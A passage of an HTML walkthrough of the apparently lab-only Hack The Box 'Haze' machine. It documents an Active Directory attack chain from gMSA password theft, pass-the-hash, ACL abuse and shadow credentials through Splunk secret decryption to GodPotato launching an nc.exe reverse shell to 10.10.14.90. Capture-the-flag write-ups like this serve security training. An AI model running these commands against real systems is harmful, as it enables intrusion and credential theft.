+                        <pre><span class="prompt">*Evil-WinRM* PS C:\Users&gt;</span> <span class="command">Find-InterestingDomainAcl -ResolveGUIDS | ?{$_.IdentityReferenceName -match "GMSA_MANAGERS"}</span></pre>
+                        <pre class="output">ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : WriteProperty
+ObjectAceType           : ms-DS-GroupMSAMembership
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
+IdentityReferenceName   : gMSA_Managers
+IdentityReferenceDomain : haze.htb
+IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
+IdentityReferenceClass  : group</pre>
+                    </div>
+                    
+
+                    <h3 id="initial-failure">Attempting to Retrieve gMSA Password (Initial Failure)</h3>
+                    <p>We initially attempted to retrieve the gMSA password directly using <code class="highlight">nxc ldap</code>, authenticating as <span class="highlight">mark.adams</span> over LDAPS (port 636) with the <code class="highlight">--gmsa</code> flag. However, this attempt failed.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa</span></pre>
+                        <pre class="output">LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
+LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
+LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: </pre>
+                    </div>
+                    
+                    <p>The reason for the failure was clear: while <span class="highlight">mark.adams</span> was in <span class="highlight">gMSA_Managers</span>, the specific permission to retrieve the gMSA's password (via the <span class="highlight">msDS-ManagedPassword</span> attribute) is granted via the <span class="highlight">msDS-GroupMSAMembership</span> attribute. We needed to explicitly set <span class="highlight">mark.adams</span> as a principal allowed to retrieve the password.</p>
+
+                    <h3 id="modifying-principal">Modifying <code class="highlight">principalAllowToRetrievePassword</code></h3>
+                    <p>To rectify this, we reconnected to the domain controller via Evil-WinRM as <span class="highlight">mark.adams</span> and executed the PowerShell command <code class="highlight">Set-ADServiceAccount</code>. This command was used to modify the <span class="highlight">Haze-IT-Backup</span> Group Managed Service Account (gMSA). Specifically, we granted the <span class="highlight">mark.adams</span> user the permission to retrieve the managed password for the <span class="highlight">Haze-IT-Backup</span> gMSA by adding <span class="highlight">mark.adams</span> to the <code class="highlight">principalAllowToRetrievePassword</code> attribute.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">*Evil-WinRM* PS C:\Users\mark.adams\Documents&gt;</span> <span class="command">Set-AdServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"</span></pre>
+                        <pre class="output"># No explicit output on success, but command completes without error.</pre>
+                    </div>
+                   
+                    <p>We successfully set the service account and the <code class="highlight">principalAllowToRetrieveManagedPassword</code> for our compromised user, <span class="highlight">mark.adams</span>.</p>
+
+                    <h3 id="successful-retrieval">Successful gMSA Password Retrieval</h3>
+                    <p>With the permissions now correctly configured, we re-ran <code class="highlight">nxc ldap</code> with the <code class="highlight">--gmsa</code> flag, authenticating as <span class="highlight">mark.adams</span>. This time, after having previously modified the <span class="highlight">Haze-IT-Backup</span> gMSA to allow <span class="highlight">mark.adams</span> to retrieve its password, we successfully obtained the NTLM hash for the <span class="highlight">Haze-IT-Backup$</span> account.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa</span></pre>
+                        <pre class="output">LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
+LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
+LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: 4de830d1d58c14e241aff55f82ecdba1</pre>
+                    </div>
+                    
+
+                    <h3 id="pass-the-hash-haze-it">Pass-the-Hash with Haze-IT-Backup$</h3>
+                    <p>With the <span class="highlight">Haze-IT-Backup$</span> account's NTLM hash (<code class="highlight">4de830d1d58c14e241aff55f82ecdba1</code>), we performed a Pass-the-Hash (PtH) attack against the domain controller (<span class="highlight">DC01</span>) at <code class="highlight">10.10.11.61</code> using <code class="highlight">nxc smb</code>. Instead of providing a cleartext password, we used the hash with the <code class="highlight">-H</code> flag. This successfully authenticated us to the SMB service as <span class="highlight">Haze-IT-Backup$</span>, confirming the hash's validity for access.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u Haze-IT-Backup$ -H 4de830d1d58c14e241aff55f82ecdba1</span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\Haze-IT-Backup$:4de830d1d58c14e241aff55f82ecdba1 </pre>
+                    </div>
+                    
+                </section>
+
+                <section>
+                    <h2 id="escalating-edward-martin"><i class="fas fa-user-shield"></i> 7. Escalating Privileges to edward.martin</h2>
+                    <p>Our BloodHound analysis became even more crucial here. The <span class="highlight">Haze-IT-Backup$</span> account, now compromised, revealed a clear path to further privilege escalation, targeting the <span class="highlight">edward.martin</span> user.</p>
+                    <img src="../images/bloodhound-vis2.png" alt="BloodHound visualization of Haze-IT-Backup$ permissions" class="inline-image"> 
+                    <img src="../images/bloodhound-vis3.png" alt="BloodHound visualization of Haze-IT-Backup$ permissions" class="inline-image"> 
+                    <p>The BloodHound screenshot visualized the critical relationships from the already compromised <span class="highlight">HAZE-IT-BACKUP$</span> account within the <span class="highlight">haze.htb</span> domain:</p>
+                    
+                    <p>It showed <span class="highlight">HAZE-IT-BACKUP$</span> has <span class="highlight">WriteOwner</span> rights over the <span class="highlight">SUPPORT_SERVICES</span> group. This is a powerful permission, allowing <span class="highlight">HAZE-IT-BACKUP$</span> to effectively seize control of that group.</p>
+                    <p>Crucially, the <span class="highlight">SUPPORT_SERVICES</span> group possessed the <span class="highlight">AddKeyCredentialLink</span> and <span class="highlight">ForceChangePassword</span> permissions over the <span class="highlight">edward.martin</span> user account. This was the ultimate target.</p>
+                    <p>Based on these critical findings, our next exploit steps were meticulously designed to leverage the <span class="highlight">WriteOwner</span> permission to gain control over <span class="highlight">edward.martin</span> via <span class="highlight">SUPPORT_SERVICES</span>:</p>
+                    <ol>
+                        <li><strong>Set WriteOwner for SUPPORT_SERVICES:</strong> Set our compromised <span class="highlight">Haze-IT-Backup$</span> account as the WriteOwner of the <span class="highlight">SUPPORT_SERVICES</span> group.</li>
+                        <li><strong>Modify WriteOwner to GenericAll:</strong> Escalate this permission to <span class="highlight">GenericAll</span> over the <span class="highlight">SUPPORT_SERVICES</span> group using <span class="highlight">Haze-IT-Backup$</span>. This grants full control.</li>
+                        <li><strong>Add Haze-IT-Backup$ to SUPPORT_SERVICES:</strong> With <span class="highlight">GenericAll</span> control, we could now add <span class="highlight">Haze-IT-Backup$</span> to the <span class="highlight">SUPPORT_SERVICES</span> group.</li>
+                        <li><strong>Compromise edward.martin:</strong> With <span class="highlight">Haze-IT-Backup$</span> as a member (and thus inheriting the permissions) of <span class="highlight">SUPPORT_SERVICES</span>, we could exploit its <span class="highlight">AddKeyCredentialLink</span> and <span class="highlight">ForceChangePassword</span> permissions to either create "shadow credentials" or reset the password for the <span class="highlight">edward.martin</span> user, effectively compromising that account.</li>
+                    </ol>
+
+                    <h3 id="writeowner-support-services">Step 1: Exploiting WriteOwner for SUPPORT_SERVICES</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">bloodyAD -d haze.htb --host dc01.haze.htb -u Haze-IT-Backup$ -p :4de830d1d58c14e241aff55f82ecdba1 set owner Support_Services 'Haze-IT-Backup$'</span></pre>
+                        <pre class="output">[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services</pre>
+                    </div>
+                    
+                    <p>Using <code class="highlight">bloodyAD</code>, we modified the owner of the <span class="highlight">Support_Services</span> group within the <span class="highlight">haze.htb</span> domain. Authenticating as <span class="highlight">Haze-IT-Backup$</span> via its NTLM hash, we successfully set <span class="highlight">Haze-IT-Backup$</span> itself as the new owner of the <span class="highlight">Support_Services</span> group. This was a preparatory step to further escalate privileges on the <span class="highlight">Support_Services</span> group.</p>
+
+                    <h3 id="escalate-genericall">Step 2: Escalating to GenericAll over SUPPORT_SERVICES</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">bloodyAD -d haze.htb --host dc01.haze.htb -u Haze-IT-Backup$ -p :4de830d1d58c14e241aff55f82ecdba1 add genericAll Support_Services Haze-IT-Backup$</span></pre>
+                        <pre class="output">[+] Haze-IT-Backup$ has now GenericAll on Support_Services</pre>
+                    </div>
+                    
+                    <p>Still using <code class="highlight">bloodyAD</code>, we granted the <span class="highlight">Haze-IT-Backup$</span> account <span class="highlight">GenericAll</span> privileges over the <span class="highlight">Support_Services</span> group. Authenticating with the <span class="highlight">Haze-IT-Backup$</span> account's NTLM hash, we successfully escalated the permissions of <span class="highlight">Haze-IT-Backup$</span> on <span class="highlight">Support_Services</span> to full control. This was a critical step, as <span class="highlight">GenericAll</span> allows us to perform virtually any action on the target object, including modifying its members.</p>
+
+                    <h3 id="add-to-support">Step 3: Adding Haze-IT-Backup$ to SUPPORT_SERVICES</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">bloodyAD -d haze.htb --host dc01.haze.htb -u Haze-IT-Backup$ -p :4de830d1d58c14e241aff55f82ecdba1 add groupMember Support_Services Haze-IT-Backup$</span></pre>
+                        <pre class="output">[+] Haze-IT-Backup$ added to Support_Services</pre>
+                    </div>
+                   
+                    <p>Leveraging the newly acquired <span class="highlight">GenericAll</span> rights, we used <code class="highlight">bloodyAD</code> to add the <span class="highlight">Haze-IT-Backup$</span> account as a member of the <span class="highlight">Support_Services</span> group within the <span class="highlight">haze.htb</span> domain. This step was crucial because <span class="highlight">Support_Services</span> possessed specific permissions (<span class="highlight">like AddKeyCredentialLink and ForceChangePassword</span>) over <span class="highlight">edward.martin</span> that <span class="highlight">Haze-IT-Backup$</span> could now inherit and utilize. Confirmed: <span class="highlight">Haze-IT-Backup is now a member of Support_services@haze.htb.</span></p>
+
+                    <h3 id="shadow-credentials">Step 4: Shadow Credentials Attack on edward.martin</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">pyWhisker.py -action add -dc-ip 10.10.11.61 -target 'edward.martin' -hashes 4de830d1d58c14e241aff55f82ecdba1 -user 'Haze-IT-Backup$' -output-file edward_martin.pfx</span></pre>
+                        <pre class="output">pyWhisker v1.0.0
+[*] Target: edward.martin
+[*] Action: Add Key Credential Link
+[*] New PFX file saved to edward_martin.pfx</pre>
+                    </div>
+                    
+                    <p>With <span class="highlight">Haze-IT-Backup$</span> now a member of <span class="highlight">SUPPORT_SERVICES</span>, we could exploit the <span class="highlight">AddKeyCredentialLink</span> permission. We used the <code class="highlight">pyWhisker.py</code> script to perform an <span class="highlight">AddKeyCredentialLink</span> attack (Shadow Credentials) against the <span class="highlight">edward.martin</span> user account. Authenticating to the domain controller (<code class="highlight">10.10.11.61</code>) as <span class="highlight">Haze-IT-Backup$</span> using its NTLM hash, we successfully added a new key credential to <span class="highlight">edward.martin</span>'s account. This new credential was saved to <code class="highlight">edward_martin.pfx</code>, allowing us to impersonate or authenticate as <span class="highlight">edward.martin</span> without knowing their actual password.</p>
+
+                    <h3 id="extract-edward-hash">Extracting edward.martin's NTLM Hash</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">python3 getnthash.py -key 4f7d504960ab0f006d39cf7b2a6278c59838e7b50d9b5f44291df694d4a2d972 haze.htb/edward.martin</span></pre>
+                        <pre class="output">[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash 09e0b3eeb2e7a6b0d419e9ff8f4d91af</pre>
+                    </div>
+                    
+                    <p>To fully utilize our control over <span class="highlight">edward.martin</span>, we extracted their NTLM hash. We used the <code class="highlight">getnthash.py</code> script (an Impacket tool) for this purpose. Providing the AES key (from the <code class="highlight">edward_martin.pfx</code> shadow credentials), the script leveraged a Ticket Granting Ticket (TGT) from the PFX file to request a ticket to itself with PAC (Privilege Attribute Certificate) and successfully recovered <span class="highlight">edward.martin</span>'s NTLM hash: <code class="highlight">09e0b3eeb2e7a6b0d419e9ff8f4d91af</code>. This hash could now be used for Pass-the-Hash attacks.</p>
+
+                    <h3 id="pass-the-hash-edward">Pass-the-Hash with edward.martin</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af </span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af </pre>
+                    </div>
+                   
+                    <p>With <span class="highlight">edward.martin</span>'s NTLM hash, we performed a Pass-the-Hash (PtH) attack against the domain controller (<span class="highlight">DC01</span>) at <code class="highlight">10.10.11.61</code> using <code class="highlight">nxc smb</code>. Authenticating as the <span class="highlight">edward.martin</span> user with their recovered NTLM hash, the <code class="highlight">[+]</code> indicated a successful authentication to the SMB service, confirming our access as <span class="highlight">edward.martin</span>.</p>
+
+                    <h3 id="winrm-shell-edward">Establishing edward.martin WinRM Shell</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">evil-winrm -i 10.10.11.61 -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af </span></pre>
+                        <pre class="output">Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami
+haze\edward.martin</pre>
+                    </div>
+                   
+                    <p>Finally, we successfully established an interactive WinRM shell on the domain controller (<code class="highlight">10.10.11.61</code>) using <code class="highlight">evil-winrm</code>. We authenticated as <span class="highlight">edward.martin</span> by providing their NTLM hash via the <code class="highlight">-H</code> flag. The <code class="highlight">whoami</code> command within the shell confirmed we were operating as <code class="highlight">haze\edward.martin</code> on the target system, granting us remote command execution capabilities.</p>
+
+                    <h3 id="splunk-backup-files">Accessing Splunk Backup Files</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">*Evil-WinRM* PS C:\Backups></span> <span class="command">dir C:\Backups\Splunk</span></pre>
+                        <pre class="output">  Directory: C:\Backups\splunk
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
+
+
+<span class="prompt">*Evil-WinRM* PS C:\Backups\splunk></span> <span class="command">download C:\Backups\Splunk\splunk_backup_2024-08-06.zip</span></pre>
+                        <pre class="output">INFO: Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip to splunk_backup_2024-08-06.zip</pre>
+                    </div>
+                    
+                        <p>While in the <code class="highlight">evil-winRM</code> shell as <span class="highlight">edward.martin</span>, we navigated to the <code class="highlight">C:\Backups</code> directory. Unlike previous accounts, <span class="highlight">edward.martin</span> had access to this directory, confirming it contained the expected Splunk application backup. We listed the contents of <code class="highlight">C:\Backups\Splunk</code> and identified a zip file named <code class="highlight">splunk_backup_2024-08-06.zip</code>. We then initiated the download of this zip file, anticipating it contained valuable data, potentially including more credentials.</p>
+
+                        <h3 id="analyze-splunk-secret">Analyzing splunk.secret Files</h3>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">cat splunk_backup_2024-08-06/Splunk/etc/auth/splunk.secret</span></pre>
+                            <pre class="output">CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B</pre>
+                            <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">cat splunk.secret</span></pre>
+                            <pre class="output">NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD</pre>
+                        </div>
+                
+                        <p>Upon downloading the <code class="highlight">splunk_backup_2024-08-06.zip</code>, we extracted its contents and immediately sought out <code class="highlight">splunk.secret</code> files.</p>
+                        <ul>
+                            <li>The first <code class="highlight">cat splunk.secret</code> command showed a <code class="highlight">splunk.secret</code> file from the newly downloaded Splunk backup (<code class="highlight">~/ctf/hTB/labs/haze/Splunk/etc/auth/splunk.secret</code>).</li>
+                            <li>The second <code class="highlight">cat ../../../splunk.secret</code> command showed the different <code class="highlight">splunk.secret</code> file, the one obtained earlier via the Splunk Path Traversal vulnerability (<code class="highlight">CVE-2024-36991</code>).</li>
+                        </ul>
+                        <p>The purpose of checking these files was to identify the correct <span class="highlight">splunk.secret</span> key. We previously used the original <span class="highlight">splunk.secret</span> along with a Splunk config file to decrypt <span class="highlight">paul.taylor</span>'s password hash. Now, with the newly downloaded Splunk backup, we found a different <span class="highlight">splunk.secret</span> file, suggesting there might be different or updated credentials within this backup that this new secret could decrypt.</p>
+
+                        <h3 id="decrypt-splunk-admin">Decrypting Splunk Admin Credentials</h3>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze/splunk$</span> <span class="command">find . -type f | grep -rP '\$\d\$\S{15,}'</span></pre>
+                            <pre class="output">etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
+    etc/system/README/inputs.conf.example:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
+    etc/system/README/user-seed.conf.example:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1
+    etc/passwd::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
+    grep: var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches
+    var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
+    var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
+    var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=</pre>
+                            <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">splunksecrets splunk-legacy-decrypt --splunk-secret Splunk/etc/auth/splunk.secret --hash '$1$YDz8WfhoCWmf6aTRkA+QqUI='</span></pre>
+                            <pre class="output">Decrypted password: Sp1unkadmin@2k24</pre>
+                        </div>
+                        <p>We began searching the downloaded Splunk backup for potential password hashes. Based on previous knowledge that Splunk hashes often follow a specific format (starting with <code class="highlight">$</code> followed by a digit, another <code class="highlight">$</code>, and then at least 15 non-whitespace characters), we used the <code class="highlight">find</code> command combined with <code class="highlight">grep -rP</code> (recursive, Perl regular expression) and the regex <code class="highlight">'\$\d\$\S{15,}'</code> to locate these patterns within all files. This successfully identified several files containing hashes, including <code class="highlight">etc/passwd</code> which contained an admin hash, and various configuration files with <code class="highlight">token</code>, <code class="highlight">pass4SymmKey</code>, <code class="highlight">sslPassword</code>, and <code class="highlight">bindDNpassword</code> entries.</p>
+                        <p>Finally, we used the <code class="highlight">splunksecrets</code> tool with the <code class="highlight">splunk-legacy-decrypt</code> option to decrypt a password hash found in the Splunk backup. We supplied the <span class="highlight">splunk.secret</span> file (from the downloaded backup) and the <code class="highlight">bindDNpassword</code> ciphertext (<code class="highlight">$1$YDz8WfhoCWmf6aTRkA+QqUI=</code>). The tool successfully decrypted the hash, revealing the cleartext password: <code class="highlight">Sp1unkadmin@2k24</code>. This was a critical credential, likely for a Splunk service account or administrative user.</p>
+                    </section>
+
+                    <section>
+                        <h2 id="final-foothold"><i class="fas fa-handshake"></i> 8. Final Foothold: Reverse Shell via Splunk App</h2>
+                        <p>While <code class="highlight">Sp1unkadmin@2k24</code> didn't work for other typical domain services, its power lay within the Splunk web application itself.</p>
+
+                        <h3 id="attack-vector">Understanding the Attack Vector</h3>
+                        <p>The decrypted Splunk credentials (<code class="highlight">Sp1unkadmin@2k24</code>) were not valid for other common services or protocols on the box. However, based on the Splunk configuration file, these credentials were tied to the domain user <span class="highlight">Alexander.green</span>.</p>
+                        <p>Using these credentials, we successfully logged into the Splunk web application as an administrator, giving us high privileges within the application. Leveraging Splunk's app upload functionality (a common way to extend Splunk's capabilities), we crafted and uploaded a malicious app containing a reverse shell payload.</p>
+
+                        <h3 id="alexander-green-shell">Gaining alexander.green Shell Access</h3>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nc -lvnp 9001</span></pre>
+                            <pre class="output">listening on [any] 9001 ...
+    connect to [10.10.14.90] from (UNKNOWN) [10.10.11.61] 50000
+    Microsoft Windows [Version 10.0.17763.4737]
+    (c) 2018 Microsoft Corporation. All rights reserved.
+
+    PS C:\Users\alexander.green> whoami
+    haze\alexander.green</pre>
+                        </div>
+                        <p>We then enumerated the permissions of the <span class="highlight">alexander.green</span> user:</p>
+            
+                    </section>
+
+                    <section>
+                        <h2 id="privesc-system"><i class="fas fa-crown"></i> 9. Privilege Escalation to SYSTEM (SeImpersonatePrivilege)</h2>
+                        <p>While inside the reverse shell as <span class="highlight">alexander.green</span>, we executed <code class="highlight">whoami /all</code> to enumerate current privileges. The output confirmed that the <span class="highlight">alexander.green</span> user possesses the <span class="highlight">SeImpersonatePrivilege (State: Enabled)</span>. This is a critical privilege that can be exploited for privilege escalation using various Potato attacks (e.g., God Potato, Juicy Potato, Rotten Potato), allowing us to impersonate higher-privileged accounts, including <span class="highlight">NT AUTHORITY\SYSTEM</span>.</p>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">PS C:\Users\alexander.green></span> <span class="command">whoami /all</span></pre>
+                            <pre class="output">USER INFORMATION
+    ----------------
+
+    User Name       SID
+    =============== =========================================
+    haze\alexander.green S-1-5-21-...</pre>
+                            <pre class="output">PRIVILEGES INFORMATION
+    ----------------------
+
+    Privilege Name                Description                               State   
+    ============================= ========================================= ========
+    SeMachineAccountPrivilege     Add workstations to domain                Disabled
+    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+    SeCreateGlobalPrivilege       Create global objects                     Enabled 
+    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</pre>
+                        </div>
+                        <p>(Alternatively, if the first command fails, you can use another command like <code class="highlight">priv</code> from PowerSploit or similar to confirm the privilege if <code class="highlight">whoami /all</code> isn't available or fails.)</p>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">C:\ProgramData></span> <span class="command">./gp.exe -cmd "C:\ProgramData\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.90 9001"</span></pre>
+                            <pre class="output">[*] CombaseModule: 0x140732774219776
+    [*] DispatchTable: 0x140732776810824
+    [*] UseProtseqFunction: 0x140732776102720
+    [*] UseProtseqFunctionParamCount: 6
+    [*] HookRPC                      
+    [*] Start PipeServer
+    [*] CreateNamedPipe \\.\pipe\05dad74e-7691-4040-931f-abd911b731a9\pipe\epmapper
+    [*] Trigger RPCSS
+    [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+    [*] DCOM obj IPID: 00006802-0a10-ffff-0547-fd6420a25c29
+    [*] DCOM obj OXID: 0x94f5987e20f9f1b1
+    [*] DCOM obj OID: 0xb70663a5f79ee31c
+    [*] DCOM obj Flags: 0x281
+    [*] DCOM obj PublicRefs: 0x0
+    [*] Marshal Object bytes len: 100 
+    [*] UnMarshal Object
+    [*] Pipe Connected!
+    [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+    [*] CurrentsImpersonationLevel: Impersonation
+    [*] Start Search System Token
+    [*] PID : 932 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+    [*] Find System Token : True
+    [*] UnmarshalObject: 0x80070776
+    [*] CurrentUser: NT AUTHORITY\SYSTEM
+    [*] process start with pid 548</pre>
+                        </div>
+                
+                        <p>We then executed the <code class="highlight">gp.exe</code> (God Potato) tool from the <code class="highlight">C:\ProgramData</code> directory (where we had uploaded our Netcat binary and GodPotato). This tool exploited the <span class="highlight">SeImpersonatePrivilege</span> previously identified. The command instructed <code class="highlight">gp.exe</code> to execute a reverse shell payload (<code class="highlight">nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.90 9001</code>). The output showed <code class="highlight">gp.exe</code> successfully identified and impersonated an <span class="highlight">NT AUTHORITY\SYSTEM</span> token, then launched the reverse shell as <span class="highlight">NT AUTHORITY\SYSTEM</span>, indicating a successful privilege escalation to SYSTEM.</p>
+
+                        <h3 id="root-machine">Rooting the Machine</h3>
+                        <div class="terminal-code">
+                            <pre><span class="prompt">C:\Users\Administrator\Desktop></span> <span class="command">dir</span></pre>
+                            <pre class="output">Volume in drive C has no label.
+    Volume Serial Number is 3985-943C
+
+    Directory of C:\Users\Administrator\Desktop
+
+    03/05/2025  06:46 PM    <DIR>          .
+    03/05/2025  12:29 AM    <DIR>          ..
+    07/02/2025  07:02 PM                34 root.txt
+                1 File(s)             34 bytes
+                2 Dir(s)   4,189,577,216 bytes free
+                </pre>
+                </div>
+                        <p>After successfully escalating privileges to <span class="highlight">NT AUTHORITY\SYSTEM</span> and receiving a new reverse shell, we navigated to the <code class="highlight">C:\Users\Administrator\Desktop</code> directory. We then listed its contents using the <code class="highlight">dir</code> command, which revealed the presence of the <code class="highlight">root.txt</code> file. This confirmed successful full system compromise and allowed for the final objective of reading the root flag.</p>
+                        <img src="../images/pwn1.png" alt="Screenshot of Splunk path traversal exploit command and output" class="inline-image"> 
+                    
+                    </section>
+
+                    <section>
+                        <h2 id="conclusion"><i class="fas fa-check-circle"></i> 10. Conclusion</h2>
+                        <p>The <span class="highlight">Haze Machine</span> engagement was a comprehensive Active Directory penetration test, demonstrating a full chain of compromise from initial reconnaissance and information gathering to full domain administrator access. This machine highlighted several common Active Directory vulnerabilities and misconfigurations, including:</p>
+                        <ul>
+                            <li>Application-level vulnerabilities (Splunk Path Traversal) leading to initial credential compromise.</li>
+                            <li>Weak machine account permissions for escalating BloodHound data collection.</li>
+                            <li>Password spraying as an effective lateral movement technique.</li>
+                            <li>Group Managed Service Account (gMSA) misconfigurations (specifically the <code class="highlight">principalAllowToRetrievePassword</code> attribute).</li>
+                            <li>Abuse of Active Directory ACLs (<span class="highlight">WriteOwner</span> leading to <span class="highlight">GenericAll</span> over groups).</li>
+                            <li>Exploitation of Windows privileges (<span class="highlight">SeImpersonatePrivilege</span>) for final SYSTEM access.</li>
+                        </ul>
+                        <p>By systematically enumerating the environment, leveraging discovered credentials, manipulating ACLs, and exploiting Windows privileges, we were able to gain full control of the domain. This walkthrough serves as a testament to the importance of continuous vigilance, comprehensive understanding of Active Directory security, and the iterative nature of penetration testing in uncovering complex attack paths.</p>
+
+                        <h3 id="key-takeaways">Key Takeaways</h3>
